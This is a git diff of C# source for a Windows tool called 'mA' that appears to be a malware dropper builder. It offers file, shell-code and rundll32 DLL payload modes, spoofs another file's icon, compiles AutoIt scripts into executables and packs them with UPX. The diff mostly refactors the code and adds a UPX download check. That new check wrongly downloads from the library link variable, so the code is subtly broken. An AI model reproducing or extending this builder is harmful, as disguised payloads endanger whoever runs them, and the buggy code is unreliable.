@@ -1,4 +1,4 @@
-﻿#define isdbg //NOTE: DO NOT FORGET TO UNDEFINE (comment out) THIS ON RELEASE.
+﻿//#define isdbg //NOTE: DO NOT FORGET TO UNDEFINE (comment out) THIS ON RELEASE.
 using System;
 using System.Collections.Generic;
 using System.ComponentModel;
@@ -19,11 +19,11 @@ namespace masamangalternatibo {
     public partial class Form1 : Form {
         public Form1() { InitializeComponent(); }
 
-        string version = "1.0";
+        string version = "0.0.0a";
         int payloadMode = 0; // 0 = File payload // 1 = Shell Code payload // 2 = Load DLL to rundll32
         string[] payloadData = new string[5]; // Stores the data from the textbox so the user can switch modes without losing the last settings
         string[] payloadFile = new string[2]; // Stores the data of ofdPayload.FileName incase the user switches modes // 0 = File Payload // 1 = DLL Payload
-        bool icolibexist = false;
+        bool[] excomp = { false, false }; // Acts as a switch if the external components exist or not // 0 = Icon Library // 1 = UPX
         int overflowCount = 20;
         string apth = Application.StartupPath;
 
@@ -100,7 +100,7 @@ namespace masamangalternatibo {
         //Extract Icon Function - used to extract icons by utilizing the IconLib Library
         private void extractIcon(bool fromButton = false, string iconfile = "") {
             //fromButton supresses error if it wasn't the users' intention to extract an icon
-            if (icolibexist && iconfile != "") {
+            if (excomp[0] && iconfile != "") {
                 dbgmsg("Extracting associated icon to bitmap...");
                 (Icon.ExtractAssociatedIcon(iconfile).ToBitmap()).Save(apth + "\\_bmptmp.bmp");
                 MultiIcon conico = new MultiIcon();
@@ -131,11 +131,16 @@ namespace masamangalternatibo {
             return tmp;
         }
 
+        //TODO: rework file checking. use recursion and arrays to check the files instead of separate ones
         //Check Component Function - Checks the required external components of mA
+        #region Check Components
         private void checkComponents() {
             // TODO: Get proper host
-            string dl1 = ""; //DL Link for the Compiler
-            string dl2 = ""; //DL Link for the Library
+            string dl1 = ""; //Link for the Compiler
+            string dl2 = ""; //Link for the Library
+            string dl3 = ""; //Link for the Compressor
+
+            //Check for the Compiler
             dbgmsg("Checking for compiler...");
             if (!(File.Exists("compiler.exe"))) {
                 if (MessageBox.Show("An important component of mA is missing!\n\nThe AutoIt compiler (compiler.exe) was not found, you cannot use mA with out the compiler as it needs to compile scripts to standalone executables.\n\nPressing Yes will download the compiler from this link\n" + dl1 + "\n\nThis will be downloaded in the background.", "Script compiler missing! // Download component \"compiler.exe\" (1.32mb)", MessageBoxButtons.YesNo) == DialogResult.Yes) {
@@ -157,6 +162,7 @@ namespace masamangalternatibo {
                 dbgmsg("compiler.exe found.");
             }
 
+            //Check for the Icon Library
             dbgmsg("Checking for IconLib...");
             if (!(File.Exists("IconLib.dll"))) {
                 if (MessageBox.Show("An important component of mA is missing!\n\nThe IconLib (IconLib.dll) Library was not found, some functions that are used by this application relies on this library file such as handling Icon conversion.\n\nPressing Yes will download the Library from this link\n" + dl2 + "\n\nThis will be downloaded in the background.", "Library missing! // Download component \"IconLib.dll\" (56.5kb)", MessageBoxButtons.YesNo) == DialogResult.Yes) {
@@ -166,28 +172,47 @@ namespace masamangalternatibo {
                     }
                     dbgmsg("Download complete!");
                     MessageBox.Show("Download complete!", "Download component \"IconLib.dll\" (56.5kb)");
-                    icolibexist = true;
+                    excomp[0] = true;
                 }
                 else {
-                    icolibexist = false;
+                    excomp[0] = false;
                     dbgmsg("WARNING: IconLib.dll is missing, some functions won't work without it.");
                     return;
                 }
             }
             else {
-                icolibexist = true;
+                excomp[0] = true;
                 dbgmsg("IconLib.dll found.");
             }
+
+            //Check for the Compressor
+            dbgmsg("Checking for UPX...");
+            if (!(File.Exists("upx.exe"))) {
+                if (MessageBox.Show("An optional component of mA is missing!\n\nThe UPX Compressor (upx.exe) was not found, This component is used to compress executable files to lessen their file size and is also utilized by the compiler.\n\nPressing Yes will download the component from this link\n" + dl3 + "\n\nThis will be downloaded in the background.", "Compressor missing! // Download component \"upx.exe\" (356kb)", MessageBoxButtons.YesNo) == DialogResult.Yes) {
+                    dbgmsg("Downloading file...");
+                    using (WebClient _wc = new WebClient()) {
+                        _wc.DownloadFile(dl2, "upx.exe");
+                    }
+                    dbgmsg("Download complete!");
+                    MessageBox.Show("Download complete!", "Download component \"upx.exe\" (356kb)");
+                    excomp[1] = true;
+                }
+                else {
+                    excomp[1] = false;
+                    dbgmsg("WARNING: upx.exe is missing, some functions won't work without it.");
+                    return;
+                }
+            }
+            else {
+                excomp[1] = true;
+                dbgmsg("upx.exe found.");
+            }
+
         }
-        
-        //Debug Message Function - Function to be utilized to output messages in the debug console prepend form
-        private void dbgmsg(string a) {
-            lblDbg.Text = a;
-            //dbgRtb.AppendText(a + "\n");
-            dbgRtb.Text = a + "\n" + dbgRtb.Text;
-        }
+        #endregion
 
         //ghetto title bar management
+        #region Title Bar
         private void titlebar_MouseMove(object sender, MouseEventArgs e) {
             if (e.Button == MouseButtons.Left) {
                 this.Location = new Point((MousePosition.X - (titlebar.Size.Width / 2)), (MousePosition.Y - (titlebar.Size.Height / 2)));
@@ -198,6 +223,14 @@ namespace masamangalternatibo {
 
         private void btnClose_Click(object sender, EventArgs e) {
             Application.Exit();
+        }
+        #endregion
+
+        //Debug Message Function - Function to be utilized to output messages in the debug console prepend form
+        private void dbgmsg(string a) {
+            lblDbg.Text = a;
+            //dbgRtb.AppendText(a + "\n");
+            dbgRtb.Text = a + "\n" + dbgRtb.Text;
         }
 
         private void loadDrives() {
@@ -213,14 +246,10 @@ namespace masamangalternatibo {
         }
 
         private void btnSwitchMode_Click(object sender, EventArgs e) {
-
-            payloadData[payloadMode] = tbPayload.Text; //Store the different payloadMode's data here so the user doesn't have to go back and forth
-
+            payloadData[payloadMode] = tbPayload.Text; //Save the current payloadData to be displayed later
             payloadMode++;
             if (payloadMode == 3) { payloadMode = 0; }
-
             switch (payloadMode) {
-
                 case 0: //Payload File Mode
                     ofdPayload.FileName = payloadFile[payloadMode];
                     btnSwitchMode.Text = "F";
@@ -248,10 +277,7 @@ namespace masamangalternatibo {
                     lblPayload.Text = "Shell Code:";
                     pnlFileOptGroup.Enabled = false;
                     break;
-
-               
             }
-
             tbPayload.Text = payloadData[payloadMode]; //Display the data of the currently selected payloadMode
         }
 
@@ -341,6 +367,11 @@ namespace masamangalternatibo {
 
         private void btnExtract_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e) {
             extractIcon(true, ofdSpoof.FileName);
+        }
+
+        private void btnMiniPad_Click(object sender, EventArgs e) {
+            minipad _minipad = new minipad();
+            _minipad.Show();
         }
     }
 }
